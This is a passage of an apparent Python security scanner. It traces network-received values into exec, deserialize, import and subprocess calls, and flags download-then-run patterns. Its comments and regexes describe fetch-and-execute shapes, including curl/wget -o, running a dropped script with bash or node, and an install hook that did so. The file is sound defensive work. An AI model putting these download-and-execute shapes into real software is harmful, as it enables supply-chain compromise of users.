    up to three wrapping calls (compile(code, …), Buffer.from(body, 'base64'))?
    It is read for _DL_ARG_SPAN characters after the whitespace, `await`s
    and parentheses it starts with."""
    i = _DL_LEAD_RE.match(row, i).end()
    limit = min(len(row), i + _DL_ARG_SPAN)
    for n in range(4):
        if n:
            i = _DL_LEAD_RE.match(row, i, limit).end()
        m = _DL_CALLEE_RE.match(row, i, limit)
        if m is None:
            return False
        if _DL_SOURCE_RE.search(row, i, m.end()) or (taint is not None and taint.live(m.group("chain"), k)):
            return True
        if m.group("call") is None:
            return False
        i = m.end()
    return False


class _DlCode:
    """row[lo:hi] read as code: its text with each string literal's contents
    blanked (the quotes kept, so offsets hold), and the literals' spans. A
    literal's contents are read as code too, on demand: quotes do not always
    pair as the language pairs them (an apostrophe in a comment, a regex
    literal), and a program for `node -e` is written in one. Each read once,
    on demand: its brackets matched (each opener's closer, the commas
    directly inside it, the innermost '(' open at given offsets), its member
    chains with those a name reaches, and its template literals and f-strings
    interpolating a live chain. Brackets match whatever their kind; offsets
    are the row's."""
    __slots__ = ("row", "lo", "hi", "lit_s", "lit_e", "code", "close", "opener", "commas", "open_paren", "es",
                 "inner", "by", "live", "holes")

    def __init__(self, row, lo, hi):
        self.row, self.lo, self.hi = row, lo, hi
        parts, self.lit_s, self.lit_e, at = [], [], [], lo
        for m in _DL_STR_RE.finditer(row, lo, hi):
            s, e = m.span()
            parts.append(row[at:s + 1])
            parts.append(" " * (e - s - 2))
            at = e - 1
            self.lit_s.append(s)
            self.lit_e.append(e)
        parts.append(row[at:hi])
        self.code = "".join(parts)
        self.close = self.opener = self.commas = None
        self.open_paren, self.es, self.inner = {}, {}, {}
        self.by, self.live, self.holes = None, [], None

    def literal_at(self, p):
        """The index of the literal whose contents hold offset p, else -1."""
        i = bisect.bisect_right(self.lit_s, p) - 1
        return i if i >= 0 and self.lit_s[i] < p < self.lit_e[i] - 1 else -1

    def segment_at(self, p):
        """The code holding offset p: this, or a literal's contents read as code."""
        i = self.literal_at(p)
        if i < 0:
            return self
        seg = self.inner.get(i)
        if seg is None:
            seg = self.inner[i] = _DlCode(self.row, self.lit_s[i] + 1, self.lit_e[i] - 1)
        return seg.segment_at(p)

    def brackets(self, queries=()):
        """Match the brackets, once; `queries`: sorted offsets to find the
        innermost open '(' at (in open_paren; None where there is none)."""
        if self.close is not None:
            return
        close, opener, commas, answers = {}, {}, {}, self.open_paren
        stack, parens, qi, lo = [], [], 0, self.lo
        for m in _DL_BRACKET_RE.finditer(self.code):
            q, ch = m.start() + lo, m.group()
            while qi < len(queries) and queries[qi] <= q:
                answers[queries[qi]] = parens[-1] if parens else None
                qi += 1
            if ch == ",":
                if stack:
                    commas.setdefault(stack[-1], []).append(q)
            elif ch in "([{":
                stack.append(q)
                if ch == "(":
                    parens.append(q)
            elif stack:
                o = stack.pop()
                if parens and parens[-1] == o:
                    parens.pop()
                close[o] = q
                opener[q] = o
        for p in queries[qi:]:
            answers[p] = parens[-1] if parens else None
        self.close, self.opener, self.commas = close, opener, commas

    def expr_start(self, j):
        """Where the expression a '(' at offset j is applied to starts —
        `https.get` for `https.get(`, `fetch(u).then` for `fetch(u).then(`, a
        group of brackets skipped whole — or None when that runs into a ')'
        or ']' without an opener. Each offset is walked once."""
        memo, code, lo, n = self.es, self.code, self.lo, len(self.code)
        path, q = [], j
        while True:
            res = memo.get(q, memo)
            if res is not memo:
                break
            path.append(q)
            r = q - lo
            if r == 0:
                res = q
                break
            ch = code[r - 1]
            if ch in _DL_CALLEE_CHARS:
                q -= 1
            elif ch == ")" or ch == "]":
                o = self.opener.get(q - 1)
                if o is None:
                    res = None
                    break
                q = o
            elif (ch == " " or ch == "\t") and ((r < n and code[r] == ".") or (r >= 2 and code[r - 2] == ".")):
                q -= 1                                  # `a . b`, a chain's indentation
            else:
                res = q
                break
        for p in path:
            memo[p] = res
        return res

    def index(self, taint, k):
        """Index the member chains, and find those the taint reaches at row k."""
        self.by = by = _dl_chain_index(self.code, self.lo)
        self.live = sorted(s for name, offs in by.items() if taint.name_live(name, k) for s in offs)

    def bound(self, name):
        """`name` is now live: the chains it starts are too."""
        for s in self.by.get(name, ()):
            bisect.insort(self.live, s)

    def live_holes(self, taint, k):
        """(starts, ends) of the template literals and f-strings that
        interpolate a chain the taint reaches at row k."""
        if self.holes is None:
            starts, ends, row = [], [], self.row
            for s, e in zip(self.lit_s, self.lit_e):
                if row[s] == "`":
                    holes = _DL_TEMPLATE_HOLE_RE.findall(row, s, e)
                else:
                    pre = row[max(self.lo, s - 2):s]
                    while pre and pre[0] not in _DL_PREFIX_CHARS:
                        pre = pre[1:]
                    if "f" not in pre and "F" not in pre:
                        continue
                    holes = _DL_FSTRING_HOLE_RE.findall(row, s, e)
                if holes and any(taint.live(c.group(), k) for c in _DL_CHAIN_RE.finditer(" ".join(holes))):
                    starts.append(s)
                    ends.append(e)
            self.holes = (starts, ends)
        return self.holes


def _dl_chain_index(code, lo=0):
    """The member chains of `code` (strings blanked) by the names they start
    with — 'r' and 'r.text' for r.text — as {name: [offset, …]}."""
    by = {}
    for m in _DL_CHAIN_RE.finditer(code):
        c, s = m.group(), m.start() + lo
        if "." not in c:
            by.setdefault(c, []).append(s)
            continue
        acc = None
        for part in _DL_DOT_RE.split(c):
            acc = part if acc is None else acc + "." + part
            by.setdefault(acc, []).append(s)
    return by


class _DlNamed:
    """The rows where a name stands whole ([\\w$]+ runs are names). The first
    _DL_NAMED_SEARCHES names are each found by a search of the text; the
    rest from an index of its names, built once."""

    def __init__(self, text, rows, starts):
        self.text, self.rows, self.starts = text, rows, starts
        self.searches, self.index = 0, None

    def find(self, name):
        head = name.split(".")[0]
        if _DL_WORD_RUN_RE.fullmatch(head) is None:
            return ()
        if self.index is None and self.searches < _DL_NAMED_SEARCHES:
            self.searches += 1
            esc = re.escape(head)
            rx = re.compile(esc + _DL_NAMED_MID + esc + _DL_NAMED_TAIL)
            out, text, starts = [], self.text, self.starts
            m = rx.search(text)
            while m is not None:
                k = bisect.bisect_right(starts, m.start()) - 1
                out.append(k)
                if k + 1 >= len(starts):
                    break
                m = rx.search(text, starts[k + 1])
            return out
        if self.index is None:
            index = {}
            for k, row in enumerate(self.rows):
                for word in set(_DL_WORD_RUN_RE.findall(row)):
                    index.setdefault(word, []).append(k)
            self.index = index
        return self.index.get(head, ())


def _dl_import_names(rows, cand):
    """The names a network module is imported under, on the rows `cand`."""
    out = set()
    for k in sorted(cand):
        row = rows[k]
        if "import" not in row or len(row) > _DL_LONG_ROW:
            continue
        for m in _DL_IMPORT_RE.finditer(row):
            if m.group("py") is not None:
                for item in m.group("py").split(","):
                    parts = item.split()
                    if parts and parts[0] in _DL_PY_NET_MODULES:
                        out.add(parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0])
                continue
            items = m.group("pyfrom") if m.group("pyfrom") is not None else m.group("esn")
            if items is None:
                out.add(m.group("es"))
                continue
            for item in items.split(","):
                parts = item.split()
                if parts:
                    out.add(parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0])
    return out


def _dl_header(row):
    """What a row says about the function a `return` below it belongs to:
    the function's name on a function header, '' on a minified row (the
    search stops there), None on any other row."""
    if len(row) > _DL_LONG_ROW:
        return ""
    h = _DL_FN_HEADER_RE.search(row)
    return None if h is None else (h.group("py") or h.group("js") or h.group("var"))


def _dl_row_above(rows, k):
    """The nearest non-blank row above k (in the window), unless minified."""
    for j in range(k - 1, max(-1, k - _DL_WINDOW - 1), -1):
        if rows[j].strip():
            return j if len(rows[j]) <= _DL_LONG_ROW else None
    return None


class _DlRow:
    """One row (or a minified row's stretch) as runs_received_code reads it:
    its code (quotes paired from its start) for what it binds, and for its
    runners' arguments, quotes paired from each call's '(': the row's own
    pairing where that is in step, else a reading begun at the '(' (at most
    _DL_PHASES of those), as a language pairs them wherever the row's
    earlier quotes are something else (an apostrophe in a comment, a regex
    literal's quote)."""
    __slots__ = ("reader", "k", "row", "taint", "hi", "top", "phases", "src_s", "src_e", "dirty", "indexed")

    def __init__(self, reader, k, row, lo, hi, taint, sources, top=True):
        self.reader, self.k, self.row, self.taint, self.hi = reader, k, row, taint, hi
        self.top = _DlCode(row, lo, hi) if top else None
        self.phases = [self.top] if top else []
        self.src_s = [s for s, _e in sources]            # (start, end) of the sources read, sorted
        self.src_e = [e for _s, e in sources]
        self.dirty = False                               # can a chain here be live?
        self.indexed = []                                # the codes whose chains are indexed

    def live(self, seg):
        """The sorted offsets of seg's chains the taint reaches (indexed on first use)."""
        if seg.by is None:
            seg.index(self.taint, self.k)
            self.indexed.append(seg)
        return seg.live

    def bound(self, name):
        """`name` is now live: the chains it starts are too."""
        for seg in self.indexed:
            seg.bound(name)

    def received_in(self, seg, lo, hi):
        """Is a source read inside [lo, hi), in seg's code (_dl_in_code)?"""
        src_s, src_e = self.src_s, self.src_e
        i = bisect.bisect_left(src_s, lo)
        while i < len(src_s) and src_e[i] <= hi:
            if _dl_in_code(seg, src_s[i]):
                return True
            i += 1
        return False

    def phase_at(self, o):
        """The code a call's '(' at offset o is read in: one where it is not
        in a literal, else a reading begun there (None past _DL_PHASES)."""
        for ph in self.phases:
            if ph.lo <= o < ph.hi and ph.literal_at(o) < 0:
                return ph
        if len(self.phases) - (self.top is not None) >= _DL_PHASES:
            return None
        ph = _DlCode(self.row, o, self.hi)
        self.phases.append(ph)
        return ph

    def runs(self, r, taint, alias=False):
        """Is the runner call `r` handed a received value (taint None: a
        download only) — as an argument, or written into an interpreter's
        command line? (`alias`: a call of a runner alias, which runs code
        whatever its name — a `run` alias is not subprocess.run.)"""
        row, k = self.row, self.k
        if _dl_defined_here(row, r.start()):
            return False                                # def exec(…), function exec(…)
        if not alias and _DL_SHELL_CALL_RE.fullmatch(r.group()) and not self.reader.shell_within(k, row, r.end()):
            return False                                # run(…) without shell=True
        o = r.end() - 1
        if o >= self.hi:
            return False                                # its '(' is past what is read
        ph = self.phase_at(o)
        if ph is None:
            return False
        ph.brackets()
        end = min(ph.hi, o + 1 + _DL_ARG_SPAN)
        c = ph.close.get(o)
        close = c if c is not None and c < end else None
        if close is not None and row[close + 1:close + 3].lstrip()[:1] == "{":
            return False                                # a method definition: exec(x) {
        starts, ends = [o + 1], []
        for x in ph.commas.get(o, ()):
            if x >= end:
                break
            ends.append(x)
            starts.append(x + 1)
        ends.append(end if close is None else close)
        src_s = self.src_s
        if taint is not None and self.dirty:
            live, holes = self.live(ph), ph.live_holes(taint, k)
        else:
            live, holes = (), ((), ())
        # each argument's value, read to its end, or where the call's are cut, as
        # _dl_carried reads it; one with nothing received in it is not read
        last = len(starts) - 1
        for i, (s, e) in enumerate(zip(starts, ends)):
            if close is None and i == last:
                e = min(self.hi, _DL_LEAD_RE.match(row, s).end() + _DL_ARG_SPAN)
            if (_dl_any(src_s, s, e) or _dl_any(live, s, e)) and _dl_carried(row, s, taint, k):
                return True
        s, e = starts[0], ends[0]
        if _DL_EMBED_RE.match(row, s, e) is None:
            return False
        return self.received_in(ph, s, e) or _dl_any(live, s, e) or _dl_within(holes[0], holes[1], s, e)


class _DlReader:
    """runs_received_code's pass over the rows: what each row binds, and
    whether it runs a received value."""

    def __init__(self, text, rows, starts, taint, sources, runners, named, seeds, sinks):
        self.text, self.rows, self.starts, self.taint = text, rows, starts, taint
        self.sources, self.runners, self.named, self.seeds = sources, runners, named, seeds
        # extra sink families to scan, as (category, alternatives): deserialize
        # and dynamic import, each added only when the file names one
        self.sinks = sinks
        self.aliases = {}                                # runner-alias name -> [definition rows]
        self.alias_call = None                           # a call of any runner alias, or None
        self.until = -1
        self.headers = {}                                # row -> _dl_header, as read
        self.last_top = (-1, None)                       # the row read last, and its code
        self.shell_row, self.shell = -1, ()              # offsets of `shell=True` on that row

    def shell_within(self, k, row, i):
        """Does a `shell=True` start within _DL_ARG_SPAN characters after row[i]?"""
        if self.shell_row != k:
            self.shell_row, self.shell = k, [m.start() for m in _DL_SHELL_ARG_RE.finditer(row)]
        return _dl_any(self.shell, i, i + _DL_ARG_SPAN + 1)

    def short_row(self, k, row):
        """Read a row of ordinary length; the category it runs a received value
        as (see runs_received_code), or None."""
        taint, rows = self.taint, self.rows
        heads = taint.heads
        found = bool(heads) and not heads.isdisjoint(_DL_HEAD_RE.findall(row))
        hot = k in self.sources
        above = _dl_row_above(rows, k) if row.lstrip()[:1] == "." else None
        if not (hot or found or (above is not None and (above in self.sources or (
                bool(heads) and not heads.isdisjoint(_DL_HEAD_RE.findall(rows[above])))))):
            return None                                  # names nothing received: binds and runs none
        srcs = [m.span() for m in _dl_finditer(_DL_SOURCE, row)] if hot else []
        rd = _DlRow(self, k, row, 0, len(row), taint, srcs)
        rd.dirty = found
        top = rd.top
        # [kind, lo, hi, match or names, continued, code]: what a fact binds from
        # row[lo:hi], its sources anywhere there, its chains in the code it is in
        facts = []
        semi = -1
        binds = _DL_BIND_RE.finditer(row) if ("=" in row or "as" in row or "for" in row or "return" in row) else ()
        for m in binds:
            seg = top.segment_at(m.start())
            if m.group("ann") is not None or m.group("lhs") or m.group("ret") is not None:
                lo = m.end()
                if semi < lo:
                    semi = row.find(";", lo)
                    semi = len(row) if semi < 0 else semi
                kind, lo, hi = ("return" if m.group("ret") is not None else "bind"), lo, semi
            elif m.group("with"):
                kind, lo, hi = "with", 0, m.start()
            else:
                kind, lo, hi = "for", m.end(), len(row)
            facts.append([kind, lo, hi, m, False, seg])
        params, queries = [], {}
        for m in (_DL_PARAMS_RE.finditer(row) if ("=>" in row or "function" in row or "lambda" in row) else ()):
            ps = m.group("fp") or m.group("ap") or m.group("one") or m.group("lp") or ""
            names = [n for n in _DL_NAME_RE.findall(_DL_DEFAULT_RE.sub("", ps)) if n not in _DL_NOT_NAMES]
            if names:
                seg = top.segment_at(m.start())
                params.append((m.start(), names, seg))
                queries.setdefault(id(seg), (seg, []))[1].append(m.start())
        for seg, offsets in queries.values():
            seg.brackets(offsets)
        first = len(row) - len(row.lstrip())
        for p, names, seg in params:
            j = seg.open_paren.get(p)
            start = None if j is None else seg.expr_start(j)
            if start is None:
                continue
            continued = seg is top and start <= first < j and row[first] == "."
            facts.append(["param", start, j, names, continued, seg])
        # which facts hold a received value; binding their names can feed the others
        above_by, above_live = None, False
        if above is not None and any(f[4] for f in facts):
            if above in self.sources:
                above_live = True
            else:
                j, code = self.last_top
                if j == above and code.by is not None:
                    above_by = code.by                   # (read just now: its chains are indexed)
                else:
                    a_row = rows[above]
                    above_by = _dl_chain_index(_DlCode(a_row, 0, len(a_row)).code)
                above_live = any(taint.name_live(n, k) for n in above_by)
        added = []
        pending = facts
        for _ in range(3):
            grew = False
            rest = []
            for f in pending:
                lo, hi, seg = f[1], f[2], f[5]
                if not (rd.received_in(seg, lo, hi) or (f[4] and above_live)
                        or (rd.dirty and _dl_any(rd.live(seg), lo, hi))):
                    rest.append(f)
                    continue
                names, how = self._names(f, row, k)
                for name in names:
                    if how == "always":
                        if name in taint.always:
                            continue
                        taint.always.add(name)
                        added.append(name)
                    elif taint.at.get(name) != k:
                        taint.at[name] = k
                        self.until = max(self.until, k + _DL_WINDOW)
                    else:
                        continue
                    grew = rd.dirty = True
                    taint.heads.add(name.split(".")[0])
                    rd.bound(name)
                    if above_by is not None and name in above_by:
                        above_live = True
            pending = rest
            if not grew:
                break
        for name in added:
            for r in self.named.find(name):
                if r > k:
                    self.seeds[r] = 1
        self.last_top = (k, top)
        # its runners, with what it binds
        for r in _dl_finditer(self.runners, row):
            if rd.runs(r, taint):
                return "run"
        for r in _dl_finditer(_DL_INTERP, row):
            if _dl_carried(row, r.end(), taint, k):
                return "run"
        from_import = bool(self.sinks) and _DL_FROM_IMPORT_RE.match(row) is not None
        for cat, sink in self.sinks:                      # deserialize, import
            for r in _dl_finditer(sink, row):
                if from_import and _DL_BARE_IMPORT_RE.fullmatch(r.group()):
                    continue                              # a Python from-import list, not import()
                if rd.runs(r, taint):
                    return cat
        if self.alias_call is not None:                   # a call of a runner alias near its definition
            for r in self.alias_call.finditer(row):
                if _dl_alias_near(self.aliases[r.group(1)], k) and rd.runs(r, taint, alias=True):
                    return "run"
        return None

    def _names(self, f, row, k):
        """(names, how) a fact that holds a received value binds: how is
        'value' (followed for _DL_WINDOW rows) or 'always'."""
        kind = f[0]
        if kind == "param":
            return f[3], "value"
        m = f[3]
        if kind == "bind":
            names = [m.group("ann")] if m.group("ann") is not None else _dl_lhs_names(m.group("lhs"))
            names = [n for n in names if n not in _DL_NOT_NAMES]
            if len(names) == 1 and "." not in names[0]:
                lo, hi = f[1], f[2]
                if _DL_MODULE_VALUE_RE.match(row, lo, hi):
                    return names, "always"
                if len(names[0]) >= 3 and _DL_FUNCTION_VALUE_RE.match(row, lo, hi):
                    return names, "always"             # const load = (u) => fetch(u)
            return names, "value"
        if kind == "with":
            return [m.group("with")], "value"
        if kind == "for":
            return _dl_lhs_names(m.group("for")), "value"
        # return VALUE: the function whose header is nearest above carries it
        fn = self.function_above(k)
        return ([fn] if fn and len(fn) >= 3 else []), "always"

    def function_above(self, k):
        """The function a `return` on row k belongs to: the name on the
        nearest function header at or above it within _DL_WINDOW rows ('' past
        a minified row), else None."""
        headers, rows = self.headers, self.rows
        for j in range(k, max(-1, k - _DL_WINDOW - 1), -1):
            h = headers.get(j, headers)
            if h is headers:
                h = headers[j] = _dl_header(rows[j])
            if h is not None:
                return h
        return None

    def long_row(self, k, row):
        """Read a minified row: only a download written straight into a
        sink's arguments, a sink that starts within _DL_LOOKBACK characters
        before a network name (the stretches merged: one pass at most). The
        category it runs a received value as, or None."""
        stretches = []
        for n in _DL_NEEDLE_RE.finditer(row):
            lo = max(0, n.start() - _DL_LOOKBACK)
            if stretches and lo <= stretches[-1][1]:
                stretches[-1][1] = n.start()
            else:
                stretches.append([lo, n.start()])
        families = [("run", self.runners)] + list(self.sinks)
        from_import = bool(self.sinks) and _DL_FROM_IMPORT_RE.match(row) is not None
        for lo, hi in stretches:
            end = min(len(row), hi + 3 * _DL_ARG_SPAN)     # a sink's name, its arguments, the last one's value
            rd = None
            search_end = min(end, hi + _DL_ARG_SPAN)
            for cat, family in families:
                for r in _dl_finditer(family, row, lo, search_end):
                    if r.start() >= hi:
                        break
                    if from_import and cat == "import" and _DL_BARE_IMPORT_RE.fullmatch(r.group()):
                        continue                           # a Python from-import list, not import()
                    if rd is None:
                        rd = _DlRow(self, k, row, lo, end, None,
                                    [m.span() for m in _dl_finditer(_DL_SOURCE, row, lo, end)], top=False)
                    if rd.runs(r, None):
                        return cat
            for r in _dl_finditer(_DL_INTERP, row, lo, search_end):
                if r.start() >= hi:
                    break
                if _dl_carried(row, r.end(), None, k):
                    return "run"
        return None


def _dl_runner_aliases(rows):
    """{name: [definition rows]} for names bound to a direct code-runner
    reference (see _DL_ALIAS_RE): a call of one within _DL_WINDOW rows below
    its definition is a runner. Window-scoped like a received value, so a
    short name reused far away (`const F = Function` in a bundle) is not a
    runner everywhere. Read from rows naming a runner and holding '='; at
    most _DL_ALIAS_MAX names are kept."""
    defs = {}
    for k, row in enumerate(rows):
        if "=" not in row or len(row) > _DL_LONG_ROW or not any(nd in row for nd in _DL_ALIAS_NEEDLES):
            continue
        for m in _DL_ALIAS_RE.finditer(row):
            name = m.group("alias")
            if name in _DL_NOT_NAMES:
                continue
            if name not in defs:
                if len(defs) >= _DL_ALIAS_MAX:
                    continue
                defs[name] = []
            defs[name].append(k)
    return defs


def _dl_alias_near(def_rows, k):
    """Is a definition row at or within _DL_WINDOW rows above k? (None: a
    runner of another file of the package, a runner everywhere.)"""
    if def_rows is None:
        return True
    i = bisect.bisect_right(def_rows, k) - 1
    return i >= 0 and k - def_rows[i] <= _DL_WINDOW


def _received_code_kind(text, extra_always=(), extra_runners=()):
    """(1-based line, category) for the first place code runs, deserializes or
    imports a value it received over the network (see runs_received_code), or
    None. Category is 'run', 'deserialize' or 'import'.

    extra_always: names known from another file of the same package to hold or
    return a received value (the cross-file follower,
    _cross_file_received_issues). They are seeded exactly like this file's own
    network-module import names, so a sink that runs one fires. extra_runners:
    names of another file's functions that run their argument as code (the
    follower's too): a call of one is a runner, like a runner alias defined
    anywhere. Both empty by default, so single-file behaviour is unchanged.

    The text is read a second time with its multi-row statements joined, its
    environment variables and members read as names and a runner handed to a
    call read as the call it makes (_dl_logical) when the first reading finds
    nothing; the line is then the one the statement starts on."""
    if not extra_runners and not any(n in text for n in _DL_SINK_NEEDLES):
        return None
    if not extra_always and not any(n in text for n in _DL_NEEDLES):
        return None
    res = _dl_kind(text, extra_always, extra_runners)
    if res is not None or len(text) > _DL_LOGICAL_MAX_CHARS:
        return res
    alt, firsts = _dl_logical(text, extra_runners)
    if alt == text:
        return None
    res = _dl_kind(alt, extra_always, extra_runners)
    if res is None:
        return None
    return (res[0] if firsts is None else firsts[res[0] - 1] + 1), res[1]


def _dl_kind(text, extra_always, extra_runners=()):
    """_received_code_kind's reading of `text` (its gates passed)."""
    rows = text.split("\n")
    starts, at = [], 0
    for row in rows:
        starts.append(at)
        at += len(row) + 1
    near = set()                                        # rows holding a network name
    m = _DL_NEEDLE_RE.search(text)
    while m is not None:
        k = bisect.bisect_right(starts, m.start()) - 1
        near.add(k)
        m = _DL_NEEDLE_RE.search(text, starts[k + 1]) if k + 1 < len(starts) else None
    taint = _DlTaint(list(_dl_import_names(rows, near) if "import" in text else ()) + list(extra_always))
    sources = {k for k in near
               if len(rows[k]) > _DL_LONG_ROW or next(_dl_finditer(_DL_SOURCE, rows[k]), None) is not None}
    if not taint.always and not sources:
        return None
    named = _DlNamed(text, rows, starts)
    seeds = bytearray(len(rows))                        # rows where a received value can start
    for r in sources:
        seeds[r] = 1
    for name in taint.always:
        for r in named.find(name):
            seeds[r] = 1
    aliases = _dl_runner_aliases(rows) if any(nd in text for nd in _DL_ALIAS_NEEDLES) else {}
    for name in extra_runners:                          # another file's runner: a runner everywhere here
        aliases[name] = None
    alias_call = None
    if aliases:                                         # a call of a runner alias, near its definition, is a runner
        alias_call = re.compile(_DL_ALIAS_CALL_HEAD + "|".join(re.escape(n) for n in sorted(aliases))
                                + _DL_ALIAS_CALL_TAIL)
        for name, def_rows in aliases.items():
            for r in named.find(name):
                seeds[r] = 1
    shell_on = "shell" in text and _DL_SHELL_TRUE_RE.search(text) is not None
    runners = _DL_RUNNER_SHELL if shell_on else _DL_RUNNER
    sinks = []                                          # the extra sink families this file names
    if any(n in text for n in _DL_DESERIAL_NEEDLES):
        sinks.append(("deserialize", _DL_DESERIAL))
    if any(n in text for n in _DL_IMPORT_NEEDLES):
        sinks.append(("import", _DL_IMPORT_SINK))
    reader = _DlReader(text, rows, starts, taint, sources, runners, named, seeds, sinks)
    reader.aliases, reader.alias_call = aliases, alias_call
    # Rows are read in order, from a seed on for _DL_WINDOW rows (and as long
    # as a value is bound): a row outside every such stretch can neither bind
    # a received value nor run one, so it is skipped.
    k = seeds.find(1)
    k = len(rows) if k < 0 else k
    while k < len(rows):
        row = rows[k]
        if len(row) > _DL_LONG_ROW:
            cat = reader.long_row(k, row)
            if cat:
                return k + 1, cat
        else:
            if seeds[k]:
                reader.until = max(reader.until, k + _DL_WINDOW)
            cat = reader.short_row(k, row)
            if cat:
                return k + 1, cat
        nk = k + 1
        if nk > reader.until:
            nk = seeds.find(1, nk)
            nk = len(rows) if nk < 0 else nk
        k = nk
    return None


def runs_received_code(text):
    """The 1-based line where code runs, deserializes or dynamically imports a
    value it received over the network (see the section comment), else None.
    `text` has \\n line endings."""
    res = _received_code_kind(text)
    return res[0] if res is not None else None


# ---------------- Download to a file, then run the file ----------------
# A weaker, MAJOR-only signal (SC-IMPORT-RISK, never CRITICAL, and never
# escalating an install hook): a received value written to a file, and that
# same file then run — subprocess.run([sys.executable, dropped]), os.system(p),
# require(p), spawn('node', [p]). This shape is statically identical to what a
# prebuilt-binary installer does (node-pre-gyp / prebuild-install /
# node-gyp-build / esbuild download a platform binary and then run it), so it
# is deliberately not part of install_script_risk (which escalates a hook to
# CRITICAL): it is a capability to review, not a verdict.
# Kept precise by three requirements: a real network source within the window,
# a file WRITE naming a path, and a RUN of that same path (a name, or the same
# string literal) in the window after it. `text` costs one pass: only rows near
# a write are read, and each search is bounded.
# a received value written to a file, naming the path (a download-to-file API,
# or a write whose window holds a source); the run of that path is the opener
# of an interpreter/exec/require/import/subprocess call. Both patterns and the
# path-token grammar are in the spec (p4, urlretrieve, and p5, curl or wget
# given `-o path` in an argument list, 0.1.8, are a download to a file on
# their own and need no separate source).
_DL_FILE_WRITE_RE = _dl_re("_DL_FILE_WRITE_RE")
_DL_FILE_WRITE_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_FILE_WRITE_NEEDLES"])
_DL_PATHRUN_SINK_RE = _dl_re("_DL_PATHRUN_SINK_RE")
_DL_PATHRUN_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_PATHRUN_NEEDLES"])
# (0.1.8) a command line in a string literal runs the file when it is a
# command's program (`./x.sh`) or what a program that runs its argument is
# given (`start install.bat`, `cmd /c x.bat`, `sh x.sh`: _DL_RUNNERS); a
# command before a | ; & or line break is one of its own
_DL_RUNNERS = frozenset(_DL_SPEC_ARRAYS["_DL_RUNNERS"])
_DL_CMD_TOKEN_RE = _dl_re("_DL_CMD_TOKEN_RE")


def _dl_norm_path(tok):
    """A path token with its surrounding quotes and a leading "./" dropped, so
    a name and the literal that names the same file compare equal."""
    if tok[:1] in "\"'":
        tok = tok[1:-1]
        while tok[:2] == "./":
            tok = tok[2:]
    return tok


def _dl_path_token(m):
    """The normalized path token a _DL_FILE_WRITE_RE match names."""
    return _dl_norm_path(next(g for g in m.groups() if g is not None))


def _dl_region_names_path(region, path):
    """Does `region` (a run sink's arguments) name the file `path` — as the
    same identifier, as a string literal for the same file, or in a command
    line a literal holds that runs it (see above)?"""
    for m in _DL_NAME_RE.finditer(region):
        if m.group() == path:
            return True
    for m in _DL_STR_RE.finditer(region):
        if _dl_norm_path(m.group()) == path or _dl_command_runs(m.group()[1:-1], path):
            return True
    return False


def _dl_command_runs(line, path):
    """Does the command line `line` run the file `path` (see above)?"""
    first, runner = True, False
    for m in _DL_CMD_TOKEN_RE.finditer(line):
        tok = m.group()
        if tok in ("|", "&", ";", "\n"):
            first, runner = True, False
            continue
        word = tok.strip("\"'")
        if first:
            if "=" in word:                        # an assignment before the command
                continue
            first = False
            runner = (word.lower() if word.isascii() else word) in _DL_RUNNERS
        elif not runner:
            continue
        while word[:2] == "./":
            word = word[2:]
        if word == path:
            return True
    return False


def _downloads_and_runs_file(text):
    """The 1-based line where a received value is written to a file that is then
    run (see the section comment), else None. MAJOR only, except in the Python
    code pip runs to install an sdist (the registry)."""
    res = _downloads_and_runs(text)
    return None if res is None else res[0]


# The shell or interpreter a written file is run with (0.1.8). A script a
# shell or an interpreter runs — subprocess.run(['/bin/bash', path]),
# spawn('node', [path]), os.system('sh ' + path), require(path) — is a
# download piped into a shell in two steps, and is CRITICAL wherever it is
# found (ptmpl's post_install.py downloaded a .sh, made it executable and ran
# it with bash). A file run on its own (a binary, started by its path) keeps
# the MAJOR shape a prebuilt binary's installer shares, and so does one
# require()d: a native addon (.node) is loaded that way.
_SCRIPT_INTERP_RE = re.compile(
    r"""(?:^|(?<=[\s\[(,'"`/\\]))(?P<name>bash|sh|zsh|dash|ksh|node|nodejs|deno|bun|pwsh|powershell|perl|ruby"""
    r"""|php|osascript|cscript|wscript)(?:\.exe)?(?=['"`\s,\])])""")
_SCRIPT_LOAD_RE = re.compile(r"""\b(?P<fork>fork)\s*\(|\b(?:execfile|run_path)\s*\(|(?<![\w$.])exec\s*\(\s*open\s*\(""")


def _dl_run_interp(row):
    """The shell or interpreter the run on `row` uses, else None: a named
    one, node for child_process.fork (which runs a module with Node.js), or
    Python for execfile / runpy.run_path / exec(open(…))."""
    m = _SCRIPT_INTERP_RE.search(row)
    if m is not None:
        return m.group("name")
    m = _SCRIPT_LOAD_RE.search(row)
    if m is None:
        return None
    return "node" if m.group("fork") else "Python"


def _dl_written_and_run(rows, is_src, downloads):
    """The row index that runs a file written in the window of a row for
    which is_src(row) holds, else None. `downloads`: urlretrieve, a download
    to a file on its own, counts without a source row. (The source rows are
    looked for only around a write: a bundle has few writes and 80,000 rows.)"""
    known = {}

    def src(j):
        got = known.get(j)
        if got is None:
            got = known[j] = len(rows[j]) <= _DL_LONG_ROW and is_src(rows[j])
        return got

    n = len(rows)
    for k, row in enumerate(rows):
        if len(row) > _DL_LONG_ROW or not any(n_ in row for n_ in _DL_FILE_WRITE_NEEDLES):
            continue
        near_src = None
        for wm in _DL_FILE_WRITE_RE.finditer(row):
            if wm.group("p4") is None and wm.group("p5") is None:
                if near_src is None:
                    near_src = any(src(j) for j in range(max(0, k - _DL_WINDOW), min(n, k + _DL_WINDOW + 1)))
                if not near_src:
                    continue                             # a plain write needs a source in its window
            elif not downloads:
                continue
            path = _dl_path_token(wm)
            if not path:
                continue
            hit = _dl_pathrun_after(rows, k, path)
            if hit is not None:
                return hit
    return None


def _downloads_and_runs(text):
    """(line, interpreter or None): where a received value is written to a
    file that is then run (see the section comment), and the shell or
    interpreter that runs it (_dl_run_interp); None when there is none."""
    if (not any(n in text for n in _DL_NEEDLES) or not any(n in text for n in _DL_FILE_WRITE_NEEDLES)
            or not any(n in text for n in _DL_PATHRUN_NEEDLES)):
        return None
    rows = text.split("\n")
    # rows holding a network source (a plain write must be near a real download;
    # urlretrieve is a download-to-file on its own)
    hit = _dl_written_and_run(rows, lambda row: next(_dl_finditer(_DL_SOURCE, row), None) is not None, True)
    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))


def _decodes_and_runs(text):
    """(line, interpreter or None) where a value the file decodes — a decode
